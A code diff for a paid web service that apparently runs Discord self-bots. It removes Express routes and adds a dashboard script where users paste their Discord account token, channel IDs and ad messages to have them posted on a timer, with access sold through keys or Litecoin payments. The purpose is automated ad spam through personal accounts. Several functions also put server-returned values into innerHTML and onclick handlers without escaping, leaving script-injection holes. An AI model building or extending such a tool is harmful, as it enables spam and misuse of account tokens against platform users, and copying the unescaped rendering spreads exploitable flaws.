+        async function addToWhitelist() {
+            const userId = document.getElementById('whitelist-id').value.trim();
+            const result = document.getElementById('whitelist-result');
+            
+            if (!userId) {
+                result.innerHTML = '<p class="error-text">Enter a User ID</p>';
+                return;
+            }
+            
+            try {
+                const res = await fetch('/api/admin/whitelist/add', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    credentials: 'same-origin',
+                    body: JSON.stringify({ userId })
+                });
+                const data = await res.json();
+                
+                if (data.success) {
+                    result.innerHTML = '<p class="success-text">User added to whitelist</p>';
+                    document.getElementById('whitelist-id').value = '';
+                    loadWhitelist();
+                } else {
+                    result.innerHTML = `<p class="error-text">${data.error}</p>`;
+                }
+            } catch (err) {
+                result.innerHTML = '<p class="error-text">Failed to add user</p>';
+            }
+        }
 
-app.post('/api/bot/stop', ensureAuthAPI, (req, res) => {
-  try {
-    const { configId = 'default' } = req.body;
-    const botKey = `${req.user.id}_${configId}`;
-    const bot = activeBots.get(botKey);
-    if (bot) { bot.destroy(); activeBots.delete(botKey); }
-    db.unregisterActiveBot(req.user.id, configId);
-    const config = db.getConfig(req.user.id, configId);
-    if (config) { config.active = 0; db.setConfig(req.user.id, config, configId); }
-    res.json({ success: true });
-  } catch (err) { res.status(500).json({ success: false, error: err.message }); }
-});
+        async function removeFromWhitelist(userId) {
+            if (!confirm('Remove this user from whitelist?')) return;
+            
+            try {
+                const res = await fetch('/api/admin/whitelist/remove', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    credentials: 'same-origin',
+                    body: JSON.stringify({ userId })
+                });
+                const data = await res.json();
+                
+                if (data.success) {
+                    loadWhitelist();
+                } else {
+                    alert('Failed to remove user');
+                }
+            } catch (err) {
+                alert('Error removing user');
+            }
+        }
 
-app.post('/api/bot/delete', ensureAuthAPI, (req, res) => {
-  try { const { configId } = req.body; db.deleteConfig(req.user.id, configId); res.json({ success: true }); }
-  catch (err) { res.status(500).json({ success: false, error: err.message }); }
-});
+        async function loadWhitelist() {
+            try {
+                const res = await fetch('/api/admin/whitelist', { credentials: 'same-origin' });
+                const data = await res.json();
+                
+                if (!data.success) {
+                    document.getElementById('whitelist-list').innerHTML = '<p class="error-text">Failed to load whitelist</p>';
+                    return;
+                }
+                
+                if (data.whitelist.length === 0) {
+                    document.getElementById('whitelist-list').innerHTML = '<p class="text-center" style="color: #6b7280;">No users whitelisted</p>';
+                    return;
+                }
+                
+                let html = '';
+                data.whitelist.forEach(userId => {
+                    html += `
+                        <div class="flex justify-between items-center bg-zinc-900 p-3 rounded-lg mb-2">
+                            <span class="font-mono text-sm" style="color: #fff;">${userId}</span>
+                            <button onclick="removeFromWhitelist('${userId}')" class="text-xs px-3 py-1 rounded" style="background: #7f1d1d; color: #fca5a5; border: none; cursor: pointer;">
+                                <i class="fa-solid fa-trash mr-1"></i>Remove
+                            </button>
+                        </div>
+                    `;
+                });
+                
+                document.getElementById('whitelist-list').innerHTML = html;
+            } catch (err) {
+                document.getElementById('whitelist-list').innerHTML = '<p class="error-text">Failed to load whitelist</p>';
+            }
+        }
 
-app.post('/api/upload/image', ensureAuthAPI, ensurePurchasedAPI, async (req, res) => {
-  try {
-    const { imageBase64 } = req.body;
-    if (!imageBase64) return res.json({ success: false, error: 'No image provided' });
-    const imageId = `img_${Date.now()}.png`;
-    const imagePath = path.join(dataDir, 'uploads');
-    if (!fs.existsSync(imagePath)) fs.mkdirSync(imagePath, { recursive: true });
-    const buffer = Buffer.from(imageBase64.split(',')[1], 'base64');
-    fs.writeFileSync(path.join(imagePath, imageId), buffer);
-    res.json({ success: true, imageUrl: `/uploads/${imageId}`, imageId });
-  } catch (err) { res.status(500).json({ success: false, error: err.message }); }
-});
+        // ====== IMAGES ======
+        function renderImages() {
+            const container = document.getElementById('images-container');
+            container.innerHTML = '';
+            
+            selectedImages.forEach((img, index) => {
+                const div = document.createElement('div');
+                div.className = 'image-item';
+                div.innerHTML = `
+                    <div class="flex justify-between items-center mb-2">
+                        <span class="image-id-badge">Image #${img.id}</span>
+                        <button onclick="removeImage(${index})" class="remove-btn">
+                            <i class="fa-solid fa-trash mr-1"></i>Remove
+                        </button>
+                    </div>
+                    <div class="upload-area ${img.base64 ? 'has-file' : ''}" onclick="document.getElementById('image-input-${index}').click()">
+                        <input type="file" id="image-input-${index}" class="image-input-file" accept="image/*" onchange="handleImageSelect(event, ${index})">
+                        <div id="upload-placeholder-${index}" class="${img.base64 ? 'hidden' : ''}">
+                            <i class="fa-solid fa-image text-3xl mb-2" style="color: #6b7280;"></i>
+                            <p class="text-sm" style="color: #9ca3af;">Click to upload image</p>
+                            <p class="text-xs mt-1" style="color: #6b7280;">PNG, JPG, GIF up to 5MB</p>
+                        </div>
+                        <img id="image-preview-${index}" class="image-preview ${img.base64 ? 'has-image' : 'hidden'} mx-auto" src="${img.base64 || ''}" />
+                    </div>
+                `;
+                container.appendChild(div);
+            });
+        }
 
-app.use('/uploads', express.static(path.join(dataDir, 'uploads')));
+        function addImage() {
+            const newId = selectedImages.length > 0 ? Math.max(...selectedImages.map(i => i.id)) + 1 : 1;
+            selectedImages.push({ id: newId, base64: null });
+            renderImages();
+        }
 
-app.get('/api/admin/keys', ensureCanGenerate, (req, res) => { const keys = db.getGeneratedKeys(); res.json({ success: true, keys }); });
-app.post('/api/admin/keys/generate', ensureCanGenerate, (req, res) => {
-  const { duration } = req.body;
-  if (!duration || !['lifetime', '1h', '24h', '7d', '30d'].includes(duration)) return res.status(400).json({ success: false, error: 'Invalid duration' });
-  let dbDuration = duration;
-  if (duration === '7d') dbDuration = '168';
-  if (duration === '30d') dbDuration = '720';
-  const keyData = db.generateKey(dbDuration);
-  res.json({ success: true, key: keyData });
-});
+        function removeImage(index) {
+            selectedImages.splice(index, 1);
+            // Reassign IDs to keep them sequential
+            selectedImages.forEach((img, i) => img.id = i + 1);
+            renderImages();
+        }
 
-app.post('/api/admin/keys/revoke', ensureOwner, (req, res) => {
-  const { key } = req.body;
-  if (!key) return res.status(400).json({ success: false, error: 'No key provided' });
-  const success = db.revokeKey(key);
-  res.json({ success });
-});
+        function handleImageSelect(event, index) {
+            const file = event.target.files[0];
+            if (!file) return;
+            
+            if (file.size > 5 * 1024 * 1024) {
+                alert('Image too large. Max 5MB.');
+                return;
+            }
+            
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                selectedImages[index].base64 = e.target.result;
+                renderImages();
+            };
+            reader.readAsDataURL(file);
+        }
 
-app.get('/api/admin/whitelist', ensureOwner, (req, res) => { res.json({ success: true, whitelist: db.getWhitelist() }); });
-app.post('/api/admin/whitelist/add', ensureOwner, (req, res) => { const { userId } = req.body; if (!userId) return res.status(400).json({ success: false, error: 'No user ID provided' }); db.addToWhitelist(userId); res.json({ success: true }); });
-app.post('/api/admin/whitelist/remove', ensureOwner, (req, res) => { const { userId } = req.body; if (!userId) return res.status(400).json({ success: false, error: 'No user ID provided' }); db.removeFromWhitelist(userId); res.json({ success: true }); });
+        // ====== MESSAGES ======
+        function renderMessages() {
+            const container = document.getElementById('messages-container');
+            container.innerHTML = '';
+            
+            messages.forEach((msg, index) => {
+                const div = document.createElement('div');
+                div.className = 'message-item';
+                div.innerHTML = `
+                    <div class="flex justify-between items-center mb-3">
+                        <span class="text-xs font-bold" style="color: #ef4444;">MESSAGE #${index + 1}</span>
+                        ${messages.length > 1 ? `
+                            <button onclick="removeMessage(${index})" class="remove-btn">
+                                <i class="fa-solid fa-trash mr-1"></i>Remove
+                            </button>
+                        ` : ''}
+                    </div>
+                    <textarea id="msg-text-${index}" rows="2" placeholder="Your ad message..." class="w-full bg-zinc-900 border border-zinc-700 rounded-2xl px-4 py-3 text-sm mb-3" style="color: #fff; resize: vertical;">${msg.text}</textarea>
+                    <div>
+                        <label class="text-xs" style="color: #6b7280;">Image IDs (comma separated, empty = all images)</label>
+                        <input id="msg-images-${index}" type="text" placeholder="e.g. 1, 2" value="${msg.imageIds ? msg.imageIds.join(', ') : ''}" class="w-full bg-zinc-900 border border-zinc-700 rounded-xl px-4 py-2 text-sm mt-1" style="color: #fff;">
+                    </div>
+                `;
+                container.appendChild(div);
+            });
+        }
 
-app.get('/', (req, res) => { if (req.isAuthenticated()) return res.redirect('/dashboard'); res.sendFile(path.join(__dirname, 'public', 'overall.html')); });
-app.get('/dashboard', (req, res) => { res.sendFile(path.join(__dirname, 'public', 'overall.html')); });
+        function addMessage() {
+            // FIX: Sync current DOM values into the messages array BEFORE adding a new one.
+            // Otherwise the user's typed text gets wiped when renderMessages() rebuilds the DOM.
+            const current = gatherMessages();
+            messages = current;
+            messages.push({ text: '', imageIds: [] });
+            renderMessages();
+        }
 
-app.use((err, req, res, next) => { console.error('[SERVER ERROR]', err); res.status(500).json({ error: err.message }); });
+        function removeMessage(index) {
+            if (messages.length <= 1) return;
+            // FIX: Sync DOM state before removing so we don't lose any edits.
+            const current = gatherMessages();
+            messages = current;
+            messages.splice(index, 1);
+            renderMessages();
+        }
 
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, '0.0.0.0', () => {
-  console.log(`[SERVER] Running on port ${PORT}`);
-  _startNoise();
-});
+        function gatherMessages() {
+            const result = [];
+            for (let i = 0; i < messages.length; i++) {
+                const textEl = document.getElementById(`msg-text-${i}`);
+                const idsEl = document.getElementById(`msg-images-${i}`);
+                const text = textEl ? textEl.value.trim() : '';
+                const idsStr = idsEl ? idsEl.value : '';
+                const imageIds = idsStr.split(',').map(s => parseInt(s.trim())).filter(n => !isNaN(n) && n > 0);
+                result.push({ text, imageIds });
+            }
+            return result;
+        }
 
-module.exports = { app, db, activeBots };
+        async function loadUserData() {
+            try {
+                const res = await fetch('/api/user', { credentials: 'same-origin' });
+                if (!res.ok) { 
+                    if (res.status === 401) window.location.href = '/login'; 
+                    return; 
+                }
+                const data = await res.json();
+                
+                isOwner = data.isOwner;
+                isWhitelisted = data.isWhitelisted;
+                canGenerate = data.canGenerate;
+                
+                const displayName = data.global_name || data.username;
+                const avatarUrl = data.avatar ? `https://cdn.discordapp.com/avatars/${data.id}/${data.avatar}.png?size=64` : 'https://cdn.discordapp.com/embed/avatars/0.png';
+                document.getElementById('user-display').innerHTML = `<img src="${avatarUrl}" class="user-avatar"><span class="text-xs bg-zinc-900 px-3 py-1 rounded-full" style="color: #fff;">${displayName}</span>`;
+                
+                if (isOwner) {
+                    document.getElementById('nav-4').classList.remove('hidden');
+                    document.getElementById('nav-5').classList.remove('hidden');
+                } else if (canGenerate) {
+                    document.getElementById('nav-4').classList.remove('hidden');
+                }
+                
+                if (data.purchased) {
+                    isPurchased = true;
+                    document.getElementById('credits-display').textContent = 'Active';
+                    document.getElementById('status-text').textContent = 'Active';
+                    document.getElementById('status-text').style.color = '#fca5a5';
+                    document.getElementById('nav-2').classList.remove('hidden');
+                    document.getElementById('nav-3').classList.remove('hidden');
+                    document.getElementById('status-box').innerHTML = '<p class="text-xl font-medium" style="color: #fca5a5;">Active</p><button onclick="switchTab(2)" class="mt-4 w-full btn-red py-3 rounded-2xl text-sm" style="border: none;">Configure</button>';
+                    document.getElementById('trial-section').classList.add('hidden');
+                    document.getElementById('active-trial-section').classList.add('hidden');
+                } else if (data.trialActive) {
+                    isTrialActive = true;
+                    trialTimeLeft = data.trialTimeLeft;
+                    document.getElementById('credits-display').textContent = 'Trial Active';
+                    document.getElementById('credits-display').style.color = '#10b981';
+                    document.getElementById('status-text').textContent = 'Trial Active';
+                    document.getElementById('status-text').style.color = '#10b981';
+                    document.getElementById('nav-2').classList.remove('hidden');
+                    document.getElementById('nav-3').classList.remove('hidden');
+                    document.getElementById('status-box').innerHTML = '<p class="text-xl font-medium" style="color: #10b981;">Trial Active</p><button onclick="switchTab(2)" class="mt-4 w-full btn-green py-3 rounded-2xl text-sm" style="border: none;">Configure</button>';
+                    document.getElementById('trial-section').classList.add('hidden');
+                    document.getElementById('active-trial-section').classList.remove('hidden');
+                    updateTrialTimerDisplay();
+                    startTrialTimer();
+                } else {
+                    const trialRes = await fetch('/api/trial/status', { credentials: 'same-origin' });
+                    const trialData = await trialRes.json();
+                    if (trialData.success && trialData.canClaim) {
+                        document.getElementById('trial-section').classList.remove('hidden');
+                    }
+                    
+                    const activityRes = await fetch('/api/activity', { credentials: 'same-origin' });
+                    const activityData = await activityRes.json();
+                    if (activityData.success && (activityData.pending || activityData.history.length > 0)) {
+                        document.getElementById('nav-3').classList.remove('hidden');
+                    }
+                }
+            } catch (err) { 
+                console.error(err); 
+            }
+        }
+
+        async function loadSavedConfigs() {
+            try {
+                const res = await fetch('/api/bot/configs', { credentials: 'same-origin' });
+                const data = await res.json();
+                
+                if (data.success && data.configs) {
+                    savedConfigs = data.configs;
+                    renderAccountsList();
+                }
+            } catch (err) { 
+                console.error('Failed to load configs:', err); 
+            }
+        }
+
+        function renderAccountsList() {
+            const container = document.getElementById('active-accounts');
+            const list = document.getElementById('accounts-list');
+            
+            if (savedConfigs.length === 0) {
+                container.classList.add('hidden');
+                return;
+            }
+            
+            container.classList.remove('hidden');
+            list.innerHTML = '';
+            
+            savedConfigs.forEach((config, index) => {
+                const isActive = config.active === 1;
+                const msgCount = config.messages ? config.messages.length : (config.message ? 1 : 0);
+                const imgCount = config.images ? config.images.length : (config.image_url ? 1 : 0);
+                
+                const card = document.createElement('div');
+                card.className = `account-card ${isActive ? 'account-active' : ''}`;
+                card.innerHTML = `
+                    <div class="flex justify-between items-start mb-2">
+                        <div>
+                            <h4 class="font-bold" style="color: #ef4444;">${config.username || 'Unknown'}</h4>
+                            <p class="text-xs mt-1" style="color: #6b7280;">Channels: ${config.channels}</p>
+                            <p class="text-xs mt-1" style="color: #8b5cf6;">
+                                <i class="fa-solid fa-message mr-1"></i>${msgCount} message${msgCount !== 1 ? 's' : ''} 
+                                <span class="mx-1">•</span> 
+                                <i class="fa-solid fa-image mr-1"></i>${imgCount} image${imgCount !== 1 ? 's' : ''}
+                            </p>
+                        </div>
+                        <span class="status-badge ${isActive ? 'status-running' : 'status-stopped'}">
+                            ${isActive ? 'Running' : 'Stopped'}
+                        </span>
+                    </div>
+                    <div class="flex gap-2 mt-3">
+                        <button onclick="editConfig('${config.id}')" class="flex-1 py-2 rounded-lg text-xs" style="background: #374151; color: #fff; border: none; cursor: pointer;">Edit</button>
+                        <button onclick="deleteConfig('${config.id}')" class="flex-1 py-2 rounded-lg text-xs text-red-200" style="background: #7f1d1d; border: none; cursor: pointer;">Delete</button>
+                    </div>
+                `;
+                list.appendChild(card);
+            });
+        }
+
+        function showNewAccountForm() {
+            currentConfigId = 'account_' + (savedConfigs.length + 1);
+            document.getElementById('form-title').textContent = 'Add New Account';
+            document.getElementById('account-badge').classList.remove('hidden');
+            document.getElementById('account-num').textContent = savedConfigs.length + 1;
+            
+            document.getElementById('token').value = '';
+            document.getElementById('channels').value = '';
+            document.getElementById('delay').value = '30';
+            document.getElementById('auto-reply-toggle').checked = false;
+            document.getElementById('auto-reply-container').classList.add('hidden');
+            document.getElementById('auto-reply-text').value = '';
+            document.getElementById('bot-status').innerHTML = '';
+            document.getElementById('send-all-at-once-toggle').checked = true;
+            document.getElementById('channel-error').style.display = 'none';
+            
+            selectedImages = [];
+            messages = [{ text: '', imageIds: [] }];
+            renderImages();
+            renderMessages();
+            
+            document.getElementById('config-form').scrollIntoView({ behavior: 'smooth' });
+        }
+
+        function editConfig(configId) {
+            const config = savedConfigs.find(c => c.id === configId);
+            if (!config) return;
+            
+            currentConfigId = configId;
+            document.getElementById('form-title').textContent = 'Edit Account';
+            document.getElementById('account-badge').classList.add('hidden');
+            
+            document.getElementById('token').value = config.token || '';
+            document.getElementById('channels').value = config.channels || '';
+            document.getElementById('delay').value = config.delay_seconds || '30';
+            document.getElementById('auto-reply-toggle').checked = config.auto_reply_enabled === 1;
+            document.getElementById('auto-reply-container').classList.toggle('hidden', config.auto_reply_enabled !== 1);
+            document.getElementById('auto-reply-text').value = config.auto_reply_text || '';
+            document.getElementById('send-all-at-once-toggle').checked = config.send_all_at_once !== 0;
+            document.getElementById('channel-error').style.display = 'none';
+            
+            // Load images
+            selectedImages = [];
+            if (config.images && Array.isArray(config.images)) {
+                selectedImages = config.images.map((img, i) => ({
+                    id: img.id || (i + 1),
+                    base64: img.url || null
+                }));
+            } else if (config.image_url) {
+                selectedImages = [{ id: 1, base64: config.image_url }];
+            }
+            renderImages();
+            
+            // Load messages
+            messages = [];
+            if (config.messages && Array.isArray(config.messages)) {
+                messages = config.messages.map(m => ({
+                    text: m.text || '',
+                    imageIds: Array.isArray(m.imageIds) ? m.imageIds : []
+                }));
+            } else if (config.message) {
+                messages = [{ text: config.message, imageIds: [] }];
+            }
+            if (messages.length === 0) messages = [{ text: '', imageIds: [] }];
+            renderMessages();
+            
+            document.getElementById('config-form').scrollIntoView({ behavior: 'smooth' });
+        }
+
+        async function deleteConfig(configId) {
+            if (!confirm('Delete this account configuration?')) return;
+            
+            try {
+                await fetch('/api/bot/delete', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    credentials: 'same-origin',
+                    body: JSON.stringify({ configId })
+                });
+                
+                await loadSavedConfigs();
+            } catch (err) { 
+                alert('Failed to delete'); 
+            }
+        }
+
+        async function redeemKey() {
+            const key = document.getElementById('redeem-key').value.trim();
+            const btn = document.getElementById('redeem-btn');
+            const result = document.getElementById('redeem-result');
+            
+            if (!key) return;
+            btn.disabled = true;
+            
+            try {
+                const res = await fetch('/api/redeem', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    credentials: 'same-origin',
+                    body: JSON.stringify({ key })
+                });
+                const data = await res.json();
+                
+                if (data.success) {
+                    result.innerHTML = '<p class="success-text">Access granted!</p>';
+                    setTimeout(() => { switchTab(0); loadUserData(); }, 1000);
+                } else {
+                    result.innerHTML = `<p class="error-text">${data.error}</p>`;
+                }
+            } catch (err) {
+                result.innerHTML = '<p class="error-text">Network error</p>';
+            } finally {
+                btn.disabled = false;
+            }
+        }
+
+        async function purchaseLifetime() {
+            const btn = document.getElementById('buy-btn');
+            const result = document.getElementById('payment-result');
+            
+            btn.disabled = true;
+            btn.textContent = 'Generating...';
+            
+            try {
+                const res = await fetch('/api/purchase/lifetime', { 
+                    method: 'POST', 
+                    headers: { 'Content-Type': 'application/json' },
+                    credentials: 'same-origin'
+                });
+                const data = await res.json();
+                
+                if (data.success) {
+                    document.getElementById('nav-3').classList.remove('hidden');
+                    
+                    if (data.existing) {
+                        result.innerHTML = `
+                            <div class="bg-zinc-900 p-5 rounded-2xl border border-zinc-700">
+                                <p class="text-sm mb-2" style="color: #fbbf24;"><i class="fa-solid fa-triangle-exclamation mr-1"></i>You already have an active address</p>
+                                <p class="text-sm mb-2" style="color: #9ca3af;">Send <strong style="color: #fff;">$3.00 USD</strong> worth of LTC to:</p>
+                                <p class="address-box text-sm mb-3">${data.address}</p>
+                                <button onclick="copyToClipboard('${data.address}')" class="w-full py-2 rounded-lg text-xs mb-3" style="background: #374151; color: #fff; border: none; cursor: pointer;">Copy</button>
+                                <p class="text-xs" style="color: #6b7280;">Expires in ${data.expiresIn} minutes • <button onclick="switchTab(3)" style="background: none; border: none; color: #ef4444; cursor: pointer;">View in Purchase Logs</button></p>
+                            </div>`;
+                    } else {
+                        const expiresAt = new Date(data.expiresAt).toLocaleTimeString();
+                        result.innerHTML = `
+                            <div class="bg-zinc-900 p-5 rounded-2xl border border-zinc-700">
+                                <p class="text-sm mb-2" style="color: #ef4444;"><i class="fa-solid fa-check mr-1"></i>Address generated!</p>
+                                <p class="text-sm mb-2" style="color: #9ca3af;">Send <strong style="color: #fff;">$3.00 USD</strong> worth of LTC to:</p>
+                                <p class="address-box text-sm mb-3">${data.address}</p>
+                                <button onclick="copyToClipboard('${data.address}')" class="w-full py-2 rounded-lg text-xs mb-3" style="background: #374151; color: #fff; border: none; cursor: pointer;">Copy</button>
+                                <p class="text-xs" style="color: #6b7280;"><i class="fa-solid fa-clock mr-1"></i>Expires at ${expiresAt} (30 min) • <button onclick="switchTab(3)" style="background: none; border: none; color: #ef4444; cursor: pointer;">View in Purchase Logs</button></p>
+                            </div>`;
+                    }
+                } else {
+                    result.innerHTML = `<p class="error-text">${data.error}</p>`;
+                }
+            } catch (err) {
+                result.innerHTML = '<p class="error-text">Server error</p>';
+            } finally {
+                btn.disabled = false;
+                btn.textContent = 'Generate Address';
+            }
+        }
+
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(text).then(() => alert('Copied!'));
+        }
+
+        async function startBot() {
+            const token = document.getElementById('token').value.trim();
+            const channels = document.getElementById('channels').value.trim();
+            const delay = document.getElementById('delay').value;
+            const autoReplyEnabled = document.getElementById('auto-reply-toggle').checked;
+            const autoReplyText = document.getElementById('auto-reply-text').value.trim();
+            const sendAllAtOnce = document.getElementById('send-all-at-once-toggle').checked;
+            const status = document.getElementById('bot-status');
+            const btn = document.getElementById('start-btn');
+            const channelError = document.getElementById('channel-error');
+            
+            const messageList = gatherMessages();
+            
+            if (!token || !channels) {
+                status.innerHTML = '<span style="color: #ef4444;">Fill all required fields</span>';
+                return;
+            }
+            
+            if (messageList.length === 0 || messageList.every(m => !m.text)) {
+                status.innerHTML = '<span style="color: #ef4444;">Enter at least one message</span>';
+                return;
+            }
+            
+            const channelArray = channels.split(',').map(c => c.trim());
+            const invalidChannels = channelArray.filter(c => !/^\d+$/.test(c));
+            if (invalidChannels.length > 0) {
+                channelError.style.display = 'block';
+                status.innerHTML = '<span style="color: #ef4444;">Channel IDs must be numbers only</span>';
+                return;
+            } else {
+                channelError.style.display = 'none';
+            }
+            
+            if (autoReplyEnabled && !autoReplyText) {
+                status.innerHTML = '<span style="color: #ef4444;">Enter auto-reply text or disable it</span>';
+                return;
+            }
+            
+            btn.disabled = true;
+            status.innerHTML = '<span style="color: #fbbf24;">Validating...</span>';
+            
+            // Prepare images payload
+            const imagesPayload = selectedImages.map(img => ({
+                id: img.id,
+                url: img.base64
+            })).filter(img => img.url);
+            
+            try {
+                const res = await fetch('/api/bot/start', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    credentials: 'same-origin',
+                    body: JSON.stringify({ 
+                        token, channels, 
+                        messages: messageList,
+                        delay, 
+                        autoReplyEnabled, autoReplyText, 
+                        configId: currentConfigId,
+                        images: imagesPayload,
+                        sendAllAtOnce
+                    })
+                });
+                const data = await res.json();
+                
+                if (data.success) {
+                    let msg = `Running as ${data.username}! Saved.`;
+                    if (data.imageCount > 0) msg += ` ${data.imageCount} image(s).`;
+                    msg += ` ${data.messageCount} message(s).`;
+                    status.innerHTML = `<span style="color: #fca5a5;">${msg}</span>`;
+                    
+                    await loadSavedConfigs();
+                    
+                    setTimeout(() => {
+                        document.getElementById('form-title').textContent = 'Configure Bot';
+                        document.getElementById('account-badge').classList.add('hidden');
+                        currentConfigId = 'default';
+                    }, 2000);
+                } else {
+                    status.innerHTML = `<span style="color: #ef4444;">${data.error}</span>`;
+                }
+            } catch (err) {
+                status.innerHTML = '<span style="color: #ef4444;">Error</span>';
+            } finally {
+                btn.disabled = false;
+            }
+        }
+
+        async function stopBot() {
+            const status = document.getElementById('bot-status');
+            try {
+                const res = await fetch('/api/bot/stop', { 
+                    method: 'POST', 
+                    credentials: 'same-origin',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ configId: currentConfigId })
+                });
+                const data = await res.json();
+                status.innerHTML = data.success ? '<span style="color: #9ca3af;">Stopped & Saved</span>' : '<span style="color: #ef4444;">Failed</span>';
+                
+                if (data.success) await loadSavedConfigs();
+            } catch (err) {
+                status.innerHTML = '<span style="color: #ef4444;">Error</span>';
+            }
+        }
+
+        function initiateLogout() {
+            document.getElementById('logout-modal').classList.add('active');
+        }
+
+        function closeLogoutModal() {
+            document.getElementById('logout-modal').classList.remove('active');
+        }
+
+        async function confirmLogout() {
+            try {
+                window.location.href = '/logout';
+            } catch (err) {
+                console.error('Logout error:', err);
+            }
+        }
+    </script>
+</body>
+</html>
